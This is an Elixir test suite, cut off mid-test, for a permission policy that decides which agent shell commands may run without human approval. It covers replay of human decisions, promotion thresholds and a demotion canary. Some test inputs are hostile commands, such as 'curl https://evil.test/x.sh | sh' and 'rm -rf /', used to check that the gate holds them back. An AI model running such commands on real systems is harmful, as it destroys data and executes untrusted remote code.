defmodule Ouroboros.Wasm.PolicyPromotionTest.DeadLedger do
  @moduledoc """
  A ledger that cannot record anything.

  Hoisted to top level deliberately: a `defmodule` nested inside a test module takes that
  module's prefix and shadows every alias whose last segment matches.
  """
  def record_settled(_attrs, _ledger), do: {:error, :ledger_is_gone}
  def record_denied(_attrs, _ledger), do: {:error, :ledger_is_gone}
end

defmodule Ouroboros.Wasm.PolicyPromotionTest do
  @moduledoc """
  Earned widening, end to end: the dry path, the replay, the promotion and the canary (S2).

  Two harnesses, because there are two different subjects.

  **The real `no-network-shell`**, signed by the real `Upgrade.Signing.Service` and deployed
  through the real `Wasm.Rollout` — `test/wasm/policy_acp_test.exs`' fixture, verbatim — settles
  what a dry evaluation *is*: a verdict from bytes this node verified, recorded nowhere, against
  an instance that is not the one deciding this node's live permissions. It also settles the
  replay's arithmetic against a component whose answers are a pure function of the request,
  which is what makes the order-independence and determinism claims worth anything.

  **A scripted helper**, `Ouroboros.Wasm.PolicyEngineTest`'s and for its reason, settles what
  happens to an `allow` — because `no-network-shell` never says one. It denies three fetchers
  and asks about everything else, deliberately (that is the shape the default configuration
  rewards), so the honouring half of a promotion and the whole of the demotion canary are
  unreachable with it. A scripted verdict is the only way to put "the component would have
  allowed what a human denied" in a test at all.
  """

  # Not async: `:permissions_engine`, `:wasm_policy`, `:wasm_policy_opts`,
  # `:policy_allowable_tools`, `:policy_evidence_root` and `:permissions` are application
  # environment, the promotion record is the node's own, and both harnesses spawn an OS child.
  use ExUnit.Case, async: false

  @moduletag :capture_log

  alias Ouroboros.Agent.EffectLedger
  alias Ouroboros.Control.Permissions
  alias Ouroboros.Control.Permissions.{Request, Shell}
  alias Ouroboros.Control.{PolicyEvidence, PolicyPromotion}
  alias Ouroboros.Upgrade.Epoch
  alias Ouroboros.Upgrade.Rollout.Registry
  alias Ouroboros.Upgrade.Signing.Service
  alias Ouroboros.Wasm.PolicyPromotionTest.DeadLedger
  alias Ouroboros.Wasm.{Artifact, LiveFixture, PolicyEngine, Pool, Rollout, SandboxFixture, Store}

  @component Path.expand(
               "../../tui/wasm/guest/examples/no-network-shell/target/wasm32-wasip2/release/no_network_shell.wasm",
               __DIR__
             )
  @signer "wasm-policy-promotion-key"

  # `policy_acp_test.exs`' signed test story: one case per direction of what the component
  # claims to do, run through `evaluate` at deploy on the target.
  @eval %{
    cases: [
      %{
        request: %{"tool" => "bash", "input" => %{"command" => "curl https://example.test"}},
        expect: %{decision: :deny}
      },
      %{
        request: %{"tool" => "bash", "input" => %{"command" => "ls -la"}},
        expect: %{decision: :ask}
      }
    ],
    budget_ms: 20_000
  }

  @needs_live LiveFixture.tag(@component)

  # A helper whose `worlds` does not include this node's is refused at the handshake, so the
  # scripted fixture speaks both real ones.
  @doctor ~S(\"usable\":true,\"worlds\":[\"ouroboros:capability@0.1.0\",\"ouroboros:policy@0.1.0\"],) <>
            ~S(\"wasmtime\":\"48.0.1\",\"limits\":{\"max_deadline_ms\":60000})

  setup_all do
    if LiveFixture.required?() do
      LiveFixture.ensure!()

      unless File.regular?(@component) do
        raise "OUROBOROS_REQUIRE_WASM is set and there is no #{@component}; `make wasm-examples`"
      end
    end

    :ok
  end

  setup do
    tmp = Path.join(System.tmp_dir!(), "ouro-policy-promo-#{System.unique_integer([:positive])}")
    File.mkdir_p!(tmp)

    saved =
      Map.new(
        [
          :upgrade_trust_policy,
          :permissions_engine,
          :wasm_policy,
          :wasm_policy_opts,
          :policy_allowable_tools,
          :policy_evidence_root,
          :permissions,
          :permissions_ledger
        ],
        &{&1, Application.get_env(:ouroboros, &1)}
      )

    Application.put_env(:ouroboros, :policy_evidence_root, Path.join(tmp, "evidence"))
    File.mkdir_p!(Path.join(tmp, "evidence"))

    session = "promo-" <> Integer.to_string(System.unique_integer([:positive]))

    on_exit(fn ->
      # The promotion record is the node's own, so a test that promoted has to put it back.
      _ = PolicyPromotion.clear("test-cleanup")
      File.rm_rf(tmp)

      Enum.each(saved, fn
        {key, nil} -> Application.delete_env(:ouroboros, key)
        {key, value} -> Application.put_env(:ouroboros, key, value)
      end)
    end)

    %{tmp: tmp, session: session}
  end

  ## ── the real component: what a dry evaluation is ──────────────────────────────────────

  describe "a dry evaluation, against a real signed policy" do
    @tag @needs_live
    test "answers the component's own verdict, by name and by digest", context do
      %{sha: sha} = live_policy!(context)

      assert {:ok, :deny, rule} =
               PolicyEngine.evaluate_with("no-network-shell", document(context, "curl https://x"))

      assert rule =~ "no-network-shell refuses a shell command containing `curl`"

      # And by the digest, which is what the canary has in hand: the record holds bytes, not a
      # name, because the name is the thing a re-deploy moves.
      assert {:ok, :ask, _rule} = PolicyEngine.evaluate_with(sha, document(context, "ls -la"))
    end

    @tag @needs_live
    test "records nothing at all", context do
      %{sha: sha} = live_policy!(context)
      before = permission_entries(sha)

      assert {:ok, :deny, _rule} =
               PolicyEngine.evaluate_with(sha, document(context, "curl https://x"))

      assert {:ok, :ask, _rule} = PolicyEngine.evaluate_with(sha, document(context, "ls"))

      # A dry evaluation is not a decision, and a ledger full of decisions nobody made is worse
      # than no ledger. Let `evaluate_with/3` reach `decided/6` and this goes red.
      assert permission_entries(sha) == before
      assert {:ok, %{records: 0}} = PolicyEvidence.count()

      # And the same through a replay, which is the only caller that keeps the dry instance
      # standing — so rows two onward take the branch a single `evaluate_with` never does, and
      # a `record/2` hidden in *that* branch would otherwise be invisible here.
      seed_corpus!(context, denied(3))
      assert {:ok, report} = PolicyEngine.replay("no-network-shell")
      assert report["corpus_size"] == 3
      assert permission_entries(sha) == before
    end

    @tag @needs_live
    test "stands its own instance and never the live one", context do
      %{sha: sha, pool: pool} = live_policy!(context)
      live = "wasm/policy/" <> sha

      assert {:ok, :deny, _rule} =
               PolicyEngine.evaluate_with(sha, document(context, "curl https://x"))

      # Nothing is standing under the live name. Point the dry path at `@instance_prefix` and
      # this goes red — which is the whole reason the dry path has a prefix of its own.
      assert {:error, %{refusal: "unknown_instance"}} =
               Pool.call(live, "evaluate", document(context, "ls"), pool)

      # And a real decision does stand it up, so the assertion above is about the dry path
      # rather than about a pool that instantiates nothing.
      assert {:deny, _stated} = PolicyEngine.evaluate(request(context, "curl https://x"))

      assert {:ok, %{"payload" => _payload}} =
               Pool.call(live, "evaluate", document(context, "ls"), pool)

      # The other half, and the one that matters on a node that is serving: a dry evaluation
      # beside a *standing* live instance leaves it standing. Give the two paths one prefix and
      # the dry path's own clean-up takes this node's permission engine down with it.
      assert {:ok, :deny, _rule} =
               PolicyEngine.evaluate_with(sha, document(context, "curl https://y"))

      assert {:ok, %{"payload" => _payload}} =
               Pool.call(live, "evaluate", document(context, "ls"), pool)
    end

    @tag @needs_live
    test "puts its own instance down unless the caller keeps it (L1, N20)", context do
      %{sha: sha, pool: pool} = live_policy!(context)
      before = Pool.status(pool).instances

      # One question, one instance's worth of work. The canary asks one and must not leave a
      # second copy of this node's permission component standing in a pool every capability
      # shares.
      for _n <- 1..3//1 do
        assert {:ok, :ask, _rule} = PolicyEngine.evaluate_with(sha, document(context, "ls -la"))
      end

      assert Pool.status(pool).instances == before

      # A batch says so and pays for one instantiation.
      assert {:ok, :ask, _rule} =
               PolicyEngine.evaluate_with(sha, document(context, "ls -la"), keep: true)

      assert Pool.status(pool).instances == before + 1

      # And a replay puts down what it stood up: delete the `Pool.drop` at the end of
      # `replay/2` and this stays at `before + 1` for the life of the node.
      seed_corpus!(context, denied(2))
      assert {:ok, _report} = PolicyEngine.replay("no-network-shell")
      assert Pool.status(pool).instances == before
    end

    @tag @needs_live
    test "a name with no live policy rollout is a named refusal", context do
      live_policy!(context)

      assert {:error, {:no_live_policy, "not-deployed"}} =
               PolicyEngine.evaluate_with("not-deployed", document(context, "ls"))

      assert {:error, {:no_live_policy, _sha}} =
               PolicyEngine.evaluate_with(String.duplicate("f", 64), document(context, "ls"))
    end
  end

  ## ── the real component: the replay's arithmetic ───────────────────────────────────────

  describe "replaying a real policy over a corpus of human answers" do
    @tag @needs_live
    test "counts agreements, asks and contradictions the way the corpus implies", context do
      %{sha: sha} = live_policy!(context)

      # Forty commands the component denies that a human also denied, and twenty it has no
      # opinion about that a human approved. `no-network-shell` never says `allow`, so there is
      # nothing here for it to contradict — which is what makes it promotable and is exactly
      # what a corpus of this shape should say.
      seed_corpus!(context, denied(40) ++ approved(20))

      assert {:ok, report} = PolicyEngine.replay("no-network-shell")

      assert report["policy_name"] == "no-network-shell"
      assert report["component_sha256"] == sha
      assert report["corpus_size"] == 60
      assert report["unreadable"] == 0

      assert report["per_tool"]["bash"] == %{
               "decisions" => 60,
               "agreements" => 40,
               "contradictions" => 0,
               "would_resolve" => 0,
               "stricter" => 0,
               "asks" => 20,
               "unreadable" => 0,
               "contradiction_rows" => []
             }

      # And per shape, which is the granularity a promotion is actually made at (S-D27). Each
      # `curl https://example.test/N` yields two candidate shapes — the first token and the
      # first two — so an operator can choose how wide a promotion to make.
      curl = report["per_shape"]["bash"]["curl"]
      assert curl["decisions"] == 40
      assert curl["agreements"] == 40
      assert curl["distinct_fingerprints"] == 40
      assert curl["distinct_sessions"] == 2
      assert curl["human_denies"] == 40
      assert curl["would_resolve"] == 0

      # `ls` is twenty abstentions: decisions counts them, and the three numbers a promotion
      # is measured on count none of them (S-D28).
      ls = report["per_shape"]["bash"]["ls"]
      assert ls["decisions"] == 20
      assert ls["asks"] == 20
      assert ls["distinct_fingerprints"] == 0
      assert ls["distinct_sessions"] == 0

      assert report["per_shape"]["bash"]["ls -la"]["decisions"] == 20

      # The thresholds ride in the report so an operator reading one file can see why a shape
      # is or is not promotable.
      assert report["thresholds"] == %{
               "contradictions" => 0,
               "unreadable" => 0,
               "distinct_fingerprints" => 20,
               "distinct_sessions" => 2,
               "would_resolve" => 1
             }

      assert is_binary(report["report_sha256"])
      assert {:ok, _at, _offset} = DateTime.from_iso8601(report["replayed_at"])
    end

    @tag @needs_live
    test "a row with no document is unreadable, never an agreement (N17)", context do
      live_policy!(context)

      seed_corpus!(context, denied(2))

      File.write!(
        PolicyEvidence.path(),
        JSON.encode!(%{
          "at" => "2026-09-08T00:00:00.000000Z",
          "node" => to_string(node()),
          "session_id" => "no-doc",
          "tool" => "bash",
          "mode" => "execute",
          "fingerprint" => %{"sha256" => String.duplicate("f", 64), "bytes" => 10},
          "decision" => "approve",
          "scope" => "once",
          "permission_entry_id" => "seeded",
          "document" => nil
        }) <> "\n",
        [:append]
      )

      assert {:ok, report} = PolicyEngine.replay("no-network-shell")
      assert report["per_tool"]["bash"]["unreadable"] == 1
      assert report["per_tool"]["bash"]["agreements"] == 2
      assert report["per_tool"]["bash"]["decisions"] == 2
    end

    @tag @needs_live
    test "a decision spelled anything but approve or deny is unreadable (M7)", context do
      live_policy!(context)

      # `score/4` matched the literal string "deny" and read everything else as an approval, so
      # a row saying "denied" turned a component's `allow` into an *agreement*.
      seed_corpus!(context, [
        {"bash", "curl https://example.test/1", "denied"},
        {"bash", "curl https://example.test/2", "reject"},
        {"bash", "curl https://example.test/3", "deny"}
      ])

      assert {:ok, report} = PolicyEngine.replay("no-network-shell")
      assert report["per_tool"]["bash"]["unreadable"] == 2
      assert report["per_tool"]["bash"]["agreements"] == 1
      assert report["per_shape"]["bash"]["curl"]["unreadable"] == 2
    end

    @tag @needs_live
    test "a policy this node cannot verify is not replayable either (N2)", context do
      # The dry path's twin. `replay/2` loads and instantiates the same bytes for ten thousand
      # rows; reading its manifest from anything less than a verification would be reading the
      # node's permission component from a file somebody else wrote.
      env = scripted_policy([evaluate: [result(verdict("allow", "unsigned"))]], signed?: false)
      seed_corpus!(context, denied(2))

      assert {:error, {:policy_not_verifiable, _reason}} = PolicyEngine.replay(env.sha)
      assert {:error, {:policy_not_verifiable, _reason}} = PolicyEngine.replay("guard")
    end

    @tag @needs_live
    test "the same corpus in a different order is the same report", context do
      live_policy!(context)
      rows = denied(30) ++ approved(20)

      seed_corpus!(context, rows)
      assert {:ok, first} = PolicyEngine.replay("no-network-shell")

      seed_corpus!(context, Enum.shuffle(rows))
      assert {:ok, shuffled} = PolicyEngine.replay("no-network-shell")

      # Counts, and the digest over them. Sort the contradiction rows out of `finish/1` and a
      # report over a reordered corpus stops being the same report.
      assert shuffled["per_tool"] == first["per_tool"]
      assert shuffled["report_sha256"] == first["report_sha256"]
    end

    @tag @needs_live
    test "two replays over one corpus produce one digest", context do
      live_policy!(context)
      seed_corpus!(context, denied(10) ++ approved(5))

      assert {:ok, first} = PolicyEngine.replay("no-network-shell")
      assert {:ok, second} = PolicyEngine.replay("no-network-shell")

      # `replayed_at` is deliberately outside the digest: it is the one field that differs
      # between two replays of the same corpus, and a digest that changed every time would say
      # nothing about whether the evidence was the same.
      assert second["report_sha256"] == first["report_sha256"]
      assert second["replayed_at"] != first["replayed_at"]
    end

    @tag @needs_live
    test "a torn line is counted and never attributed to a tool", context do
      live_policy!(context)
      seed_corpus!(context, denied(3))
      File.write!(PolicyEvidence.path(), "{not json\n", [:append])

      assert {:ok, report} = PolicyEngine.replay("no-network-shell")
      assert report["corpus_size"] == 4
      assert report["unreadable"] == 1
      assert report["per_tool"]["bash"]["decisions"] == 3
    end
  end

  ## ── the real component: promotion ─────────────────────────────────────────────────────

  describe "promoting a real policy" do
    @tag @needs_live
    test "a component that resolves nothing earns nothing, however much it agreed", context do
      # H1, on the real component. `no-network-shell` denies every fetcher and asks about
      # everything else, so a corpus of sixty answers it agreed with forty times still gives it
      # no claim on anything: a promotion whose `would_resolve` is zero removes no prompt and
      # buys only the right to say `allow` and be believed (S-D28).
      live_policy!(context)
      seed_corpus!(context, denied(40) ++ approved(20))

      assert {:ok, report} = PolicyEngine.replay("no-network-shell")
      assert report["per_shape"]["bash"]["curl"]["distinct_fingerprints"] == 40
      assert report["per_shape"]["bash"]["curl"]["contradictions"] == 0

      assert {:error, {:promotion_would_resolve_nothing, "bash", "curl"}} =
               PolicyEngine.promote("no-network-shell", "bash", "curl", report, "operator:ana")

      # And the shape it abstained on has no definite verdict at all to count.
      assert {:error, {:not_enough_distinct_requests, "bash", "ls", 0, 20}} =
               PolicyEngine.promote("no-network-shell", "bash", "ls", report, "operator:ana")

      assert PolicyPromotion.policy() == nil
    end

    @tag @needs_live
    test "refuses a corpus that has not shown it enough", context do
      live_policy!(context)
      seed_corpus!(context, denied(19))

      assert {:ok, report} = PolicyEngine.replay("no-network-shell")

      assert {:error, {:not_enough_distinct_requests, "bash", "curl", 19, 20}} =
               PolicyEngine.promote("no-network-shell", "bash", "curl", report, "operator:ana")

      assert PolicyPromotion.policy() == nil
    end

    @tag @needs_live
    test "refuses a tool it is not built to promote, and a shape nobody has evidence for",
         context do
      live_policy!(context)
      seed_corpus!(context, denied(60))

      assert {:ok, report} = PolicyEngine.replay("no-network-shell")

      # A shape is a command prefix. `read` has none, and a promotion language that quietly
      # meant nothing for it would be worse than a refusal that names it.
      assert {:error, {:tool_not_promotable, "read"}} =
               PolicyEngine.promote("no-network-shell", "read", "anything", report, "operator")

      assert {:error, {:no_decisions_for_shape, "bash", "mix test"}} =
               PolicyEngine.promote(
                 "no-network-shell",
                 "bash",
                 "mix test",
                 report,
                 "operator:ana"
               )
    end

    @tag @needs_live
    test "refuses a report about other bytes, and one somebody edited", context do
      live_policy!(context)
      seed_corpus!(context, denied(40) ++ approved(20))
      assert {:ok, report} = PolicyEngine.replay("no-network-shell")

      other = Map.put(report, "component_sha256", String.duplicate("c", 64))

      assert {:error, {:report_names_other_bytes, _sha}} =
               PolicyEngine.promote("no-network-shell", "bash", "curl", other, "operator:ana")

      # The gate that makes the file an operator carries around worth carrying: a report whose
      # numbers were edited no longer hashes to its own digest.
      edited = put_in(report, ["per_tool", "bash", "decisions"], 5_000)

      assert {:error, :report_digest_mismatch} =
               PolicyEngine.promote("no-network-shell", "bash", "curl", edited, "operator:ana")

      assert {:error, :report_unsealed} =
               PolicyEngine.promote(
                 "no-network-shell",
                 "bash",
                 "curl",
                 Map.delete(report, "report_sha256"),
                 "operator:ana"
               )

      assert PolicyPromotion.policy() == nil
    end
  end

  ## ── the scripted helper: what a promotion is measured on ──────────────────────────────

  describe "what a corpus has to show before a shape is promoted (S-D28)" do
    test "sixty human denies and sixty abstentions promote nothing (H1)", context do
      # The reviewer's first exploit, adopted. `decisions` counted an `ask`, so a component
      # that answered `ask` to every row in the corpus reached "fifty decisions, zero
      # contradictions" having demonstrated nothing at all — and the right it was then granted
      # was precisely the right to say `allow` and be believed.
      scripted_policy(
        evaluate:
          List.duplicate(result(verdict("ask", "no opinion")), 120) ++
            List.duplicate(result(verdict("allow", "now I have one")), 8)
      )

      seed_corpus!(
        context,
        for(n <- 1..60//1, do: {"bash", "rm -rf /data/#{n}", "deny", session(n)})
      )

      assert {:ok, report} = PolicyEngine.replay("guard")
      counts = report["per_shape"]["bash"]["rm"]
      assert counts["decisions"] == 60
      assert counts["asks"] == 60
      assert counts["distinct_fingerprints"] == 0
      assert counts["distinct_sessions"] == 0
      assert counts["would_resolve"] == 0

      assert {:error, {:not_enough_distinct_requests, "bash", "rm", 0, 20}} =
               PolicyEngine.promote("guard", "bash", "rm", report, "operator:ana")

      assert PolicyPromotion.policy() == nil
    end

    test "fifty copies of one answer in one session promote nothing (M1)", context do
      # The reviewer's padding exploit, adopted. The floor was a row count, so a corpus of
      # fifty copies of one answer — one command, approved over and over in one session, which
      # is exactly what a human answering `mix test` again and again produces — cleared it.
      scripted_policy(evaluate: List.duplicate(result(verdict("allow", "fine")), 220))

      seed_corpus!(context, List.duplicate({"bash", "mix test", "approve"}, 50))

      assert {:ok, report} = PolicyEngine.replay("guard")
      counts = report["per_shape"]["bash"]["mix test"]
      assert counts["decisions"] == 50
      assert counts["would_resolve"] == 50
      assert counts["distinct_fingerprints"] == 1
      assert counts["distinct_sessions"] == 1

      assert {:error, {:not_enough_distinct_requests, "bash", "mix test", 1, 20}} =
               PolicyEngine.promote("guard", "bash", "mix test", report, "operator:ana")
    end

    test "twenty distinct requests in one session promote nothing either (M1)", context do
      scripted_policy(evaluate: List.duplicate(result(verdict("allow", "fine")), 220))

      seed_corpus!(
        context,
        for(n <- 1..25//1, do: {"bash", "mix test #{n}", "approve", "one-session"})
      )

      assert {:ok, report} = PolicyEngine.replay("guard")
      assert report["per_shape"]["bash"]["mix test"]["distinct_fingerprints"] == 25

      assert {:error, {:not_enough_sessions, "bash", "mix test", 1, 2}} =
               PolicyEngine.promote("guard", "bash", "mix test", report, "operator:ana")
    end

    test "a verdict outside the grammar on the shape's rows refuses it (N16)", context do
      # S-D23 made a gate: the dry path reads an unreadable verdict as an error, and a
      # component cannot duck a contradiction by answering unreadably.
      plan =
        List.duplicate(result(verdict("allow", "fine")), 25) ++
          List.duplicate(result(gibberish("no comment")), 5)

      scripted_policy(evaluate: plan ++ plan ++ plan)

      seed_corpus!(
        context,
        for(n <- 1..25//1, do: {"bash", "mix test #{n}", "approve", session(n)}) ++
          for(n <- 1..5//1, do: {"bash", "mix test evil#{n}", "deny", session(n)})
      )

      assert {:ok, report} = PolicyEngine.replay("guard")
      counts = report["per_shape"]["bash"]["mix test"]
      assert counts["unreadable"] == 5
      assert counts["contradictions"] == 0

      assert {:error, {:policy_verdict_unreadable_on_shape, "bash", "mix test", 5}} =
               PolicyEngine.promote("guard", "bash", "mix test", report, "operator:ana")
    end

    test "a contradiction anywhere in the tool refuses every shape of it", context do
      scripted_policy(evaluate: List.duplicate(result(verdict("allow", "fine")), 220))

      seed_corpus!(
        context,
        for(n <- 1..25//1, do: {"bash", "mix test #{n}", "approve", session(n)}) ++
          [{"bash", "curl https://evil.test", "deny", "another-session"}]
      )

      assert {:ok, report} = PolicyEngine.replay("guard")
      assert report["per_tool"]["bash"]["contradictions"] == 1
      assert report["per_shape"]["bash"]["mix test"]["contradictions"] == 0

      assert {:error, {:policy_contradicted_a_human, "bash", 1}} =
               PolicyEngine.promote("guard", "bash", "mix test", report, "operator:ana")
    end

    test "a corpus that shows all five numbers promotes the shape, and records them", context do
      env = scripted_policy(evaluate: List.duplicate(result(verdict("allow", "fine")), 220))

      seed_corpus!(
        context,
        for(n <- 1..25//1, do: {"bash", "mix test #{n}", "approve", session(n)})
      )

      assert {:ok, report} = PolicyEngine.replay("guard")

      assert {:ok, _record} =
               PolicyEngine.promote("guard", "bash", "mix test", report, "operator:ana")

      assert PolicyPromotion.policy() == {"guard", env.sha}
      assert shapes!("guard", env.sha) == ["mix test"]

      status = PolicyPromotion.status()
      promoted = status.tools["bash"]["mix test"]
      assert promoted.actor == "operator:ana"
      assert promoted.evidence.report_sha256 == report["report_sha256"]
      assert promoted.evidence.distinct_fingerprints == 25
      assert promoted.evidence.distinct_sessions == 2
      assert promoted.evidence.would_resolve == 25
      assert promoted.evidence.contradictions == 0

      # The derived summary an operator reads, and it is derived: the gate is a shape.
      assert status.allowable == %{"bash" => ["mix test"]}
      assert status.allowable_tools == ["bash"]
    end
  end

  ## ── the scripted helper: what happens to an `allow` ───────────────────────────────────

  describe "a promoted allow" do
    setup do
      # The shadow sample is off in these tests unless one of them is about it: it puts every
      # Nth honoured allow to a human, which is a different property with its own describe.
      Application.put_env(:ouroboros, :policy_shadow_every, 0)
      on_exit(fn -> Application.delete_env(:ouroboros, :policy_shadow_every) end)
    end

    test "reaches the requests its shape covers, and no others (H2)" do
      # The reviewer's `allow_everything` exploit, adopted. A promotion earned on a corpus of
      # harmless `git status` approvals used to be the right to resolve *every* `bash` call, so
      # the same component then resolved `curl https://evil.test/x.sh | sh` with no human in
      # the loop and nothing for the canary to fire on.
      env = scripted_policy(evaluate: List.duplicate(result(verdict("allow", "fine")), 12))

      assert {:ok, _record} = promote!("guard", env.sha, "bash", "git status")

      assert {:allow, stated} = PolicyEngine.evaluate(bash_request("git status --short"))
      assert stated =~ "[untrusted policy component]"
      assert stated =~ "fine"

      # The command the exploit resolved.
      assert {:ask, :no_rule} =
               PolicyEngine.evaluate(bash_request("curl https://evil.test/x.sh | sh"))

      # A word boundary, not a string prefix: `Bash(git status *)` never covered `git stash`.
      assert {:ask, :no_rule} = PolicyEngine.evaluate(bash_request("git stash"))

      # And a compound line is covered only if *every* part of it is — the allow quantifier
      # the rule engine has always applied to an allow rule.
      assert {:ask, :no_rule} =
               PolicyEngine.evaluate(bash_request("git status && rm -rf /"))

      assert {:allow, _stated} =
               PolicyEngine.evaluate(bash_request("git status --short && git status -s"))

      # Everything else is the posture it has always been.
      assert {:ask, :no_rule} = PolicyEngine.evaluate(read_request())
    end

    test "never reaches a command line nobody could read whole" do
      env = scripted_policy(evaluate: List.duplicate(result(verdict("allow", "fine")), 8))
      assert {:ok, _record} = promote!("guard", env.sha, "bash", "git status")

      # `Shell.split/1` judges at most sixty-four sub-commands and eight kibibytes. A request
      # past either is covered by nothing, which is `Control.Permissions.Rules`' own refusal to
      # let an allow rule win over a request it could not read whole.
      padded = Enum.map_join(1..70//1, " && ", fn _n -> "git status" end)
      assert {:ask, :no_rule} = PolicyEngine.evaluate(bash_request(padded))
    end

    test "is not honoured for a policy the record is not bound to" do
      env = scripted_policy(evaluate: List.duplicate(result(verdict("allow", "fine")), 4))

      # The record names another component. Drop the name match in `allowable_shapes/4` and one
      # policy's earned reputation becomes every policy's.
      assert {:ok, _record} = promote!("somebody-else", env.sha, "bash", "git status")
      assert {:ask, :no_rule} = PolicyEngine.evaluate(bash_request("git status"))
    end

    test "is not honoured for bytes the record was not promoted for" do
      env = scripted_policy(evaluate: List.duplicate(result(verdict("allow", "fine")), 4))

      # A re-deployed policy is different bytes and has earned nothing. Drop the sha match in
      # `allowable_shapes/4` and widening a policy becomes a one-time cost every later version
      # of it inherits.
      assert {:ok, _record} = promote!("guard", String.duplicate("e", 64), "bash", "git status")
      refute env.sha == String.duplicate("e", 64)
      assert {:ask, :no_rule} = PolicyEngine.evaluate(bash_request("git status"))
    end

    test "still needs the ledger, exactly as the configured list does" do
      scripted_policy(evaluate: List.duplicate(result(verdict("allow", "fine")), 4))
      assert {:ok, _record} = promote!("guard", scripted_sha(), "bash", "git status")
      Application.put_env(:ouroboros, :permissions_ledger, DeadLedger)

      # An approval nobody can later account for has not been granted, however it was earned.
      assert {:ask, :unrecordable} = PolicyEngine.evaluate(bash_request("git status"))
    end

    test "an operator's own list is not shape-scoped and not sampled" do
      Application.put_env(:ouroboros, :policy_shadow_every, 1)
      Application.put_env(:ouroboros, :policy_allowable_tools, ["bash"])
      scripted_policy(evaluate: List.duplicate(result(verdict("allow", "fine")), 8))

      # No promotion at all, and every call resolved: an operator naming a tool has made a
      # statement about that tool, and nothing here second-guesses it.
      assert {:allow, _stated} = PolicyEngine.evaluate(bash_request("anything at all"))
      assert {:allow, _stated} = PolicyEngine.evaluate(bash_request("rm -rf /"))
    end
  end

  describe "shadow sampling (S-D29)" do
    test "every Nth honoured allow is put to a human anyway" do
      Application.put_env(:ouroboros, :policy_shadow_every, 3)
      on_exit(fn -> Application.delete_env(:ouroboros, :policy_shadow_every) end)

      env = scripted_policy(evaluate: List.duplicate(result(verdict("allow", "fine")), 24))
      assert {:ok, _record} = promote!("guard", env.sha, "bash", "git status")

      answers =
        for n <- 1..6//1, do: PolicyEngine.evaluate(bash_request("git status ##{n}"))

      # Two of the six went to a human, and they are the third and the sixth: the sample is a
      # counter per `(tool, shape)`, not a coin.
      assert [
               {:allow, _1},
               {:allow, _2},
               {:ask, :policy_shadow},
               {:allow, _4},
               {:allow, _5},
               {:ask, :policy_shadow}
             ] = answers
    end

    test "zero disables it, which is what blinds the canary" do
      Application.put_env(:ouroboros, :policy_shadow_every, 0)
      on_exit(fn -> Application.delete_env(:ouroboros, :policy_shadow_every) end)

      env = scripted_policy(evaluate: List.duplicate(result(verdict("allow", "fine")), 24))
      assert {:ok, _record} = promote!("guard", env.sha, "bash", "git status")

      for n <- 1..6//1 do
        assert {:allow, _stated} = PolicyEngine.evaluate(bash_request("git status ##{n}"))
      end
    end

    test "a malformed setting falls back to the default rather than to nothing" do
      Application.put_env(:ouroboros, :policy_shadow_every, "every other one")
      on_exit(fn -> Application.delete_env(:ouroboros, :policy_shadow_every) end)
      assert PolicyEngine.shadow_every() == 10

      Application.put_env(:ouroboros, :policy_shadow_every, -1)
      assert PolicyEngine.shadow_every() == 10

      Application.put_env(:ouroboros, :policy_shadow_every, 100_000)
      assert PolicyEngine.shadow_every() == 10
    end
  end

  describe "the demotion canary" do
    test "a human deny the policy would have allowed demotes the covering shapes" do
      env = scripted_policy(evaluate: List.duplicate(result(verdict("allow", "fine")), 8))
      assert {:ok, _record} = promote!("guard", env.sha, "bash", "git")
      assert {:ok, _record} = promote!("guard", env.sha, "bash", "git status")
      assert shapes!("guard", env.sha) == ["git", "git status"]

      request = bash_request("git status --short")

      assert :ok =
               PolicyEngine.record("canary-1", %{
                 decision: :deny,
                 scope: :once,
                 actor: :human,
                 request: request
               })

      # One contradiction is enough: the threshold a promotion cleared was *zero*, so a single
      # one is the evidence for that promotion being false. Both shapes covered the call, and
      # demoting one and leaving the other would leave it resolvable.
      await_shapes("guard", env.sha, [])
      demotions = PolicyPromotion.status().demotions
      assert Enum.map(demotions, & &1.shape) |> Enum.sort() == ["git", "git status"]
      assert Enum.all?(demotions, &(&1.reason == :human_contradiction))
      assert Enum.all?(demotions, &(&1.tool == "bash"))
      assert Enum.all?(demotions, &(&1.session_id == "canary-session"))

      assert Enum.all?(
               demotions,
               &(&1.fingerprint == Permissions.fingerprint(Request.new(request)).sha256)
             )

      # And the answer that caused it is recorded exactly as it would have been.
      assert [row] = corpus_rows()
      assert row["decision"] == "deny"
      assert row["tool"] == "bash"
    end

    test "record/2 returns without waiting for the dry ask (L7)" do
      # The canary is a synchronous round trip through the node's one shared helper pool, and
      # the thing waiting on `record/2` is a human's answer being acknowledged. A pool that
      # takes a second to answer must cost the demotion that second, not the answer.
      env =
        scripted_policy([evaluate: List.duplicate(result(verdict("allow", "fine")), 8)],
          delay_ms: 900
        )

      assert {:ok, _record} = promote!("guard", env.sha, "bash", "git status")

      {elapsed_us, :ok} =
        :timer.tc(fn ->
          PolicyEngine.record("canary-slow", %{
            decision: :deny,
            scope: :once,
            actor: :human,
            request: bash_request("git status --short")
          })
        end)

      assert elapsed_us < 500_000,
             "record/2 waited #{div(elapsed_us, 1000)}ms for the canary's dry ask"

      # And the demotion still lands, within the turn.
      await_shapes("guard", env.sha, [])
    end

    test "a rule's deny is not a human contradiction" do
      env = scripted_policy(evaluate: List.duplicate(result(verdict("allow", "fine")), 8))
      assert {:ok, _record} = promote!("guard", env.sha, "bash", "git status")

      assert :ok =
               PolicyEngine.record("canary-2", %{
                 decision: :deny,
                 actor: :rule,
                 rule_ref: %{scope: :node, id: "n", pattern: "Bash(*)"},
                 request: bash_request("git status")
               })

      # Widen the actor check in `canary/1` and a node's own rules start demoting the policy
      # that was promoted for the calls those rules never see. The sentinel is what makes that
      # observable: if the rule's deny demoted, the shape is gone before the human's deny
      # arrives and the demotion the record holds is the rule's, in the rule's session.
      assert [demotion] = sentinel_demotion!("guard", env.sha, "canary-2-sentinel")
      assert demotion.session_id == "sentinel-session"
    end

    test "a human approve is not a contradiction either" do
      env = scripted_policy(evaluate: List.duplicate(result(verdict("allow", "fine")), 8))
      assert {:ok, _record} = promote!("guard", env.sha, "bash", "git status")

      assert :ok =
               PolicyEngine.record("canary-3", %{
                 decision: :approve,
                 actor: :human,
                 request: bash_request("git status")
               })

      assert [demotion] = sentinel_demotion!("guard", env.sha, "canary-3-sentinel")
      assert demotion.session_id == "sentinel-session"
    end

    test "a deny the policy would also have denied leaves the promotion standing" do
      # One `deny` in the plan, then `allow`s: the first canary ask agrees with the human and
      # must change nothing, and the sentinel's ask is the one that contradicts.
      env =
        scripted_policy(
          evaluate:
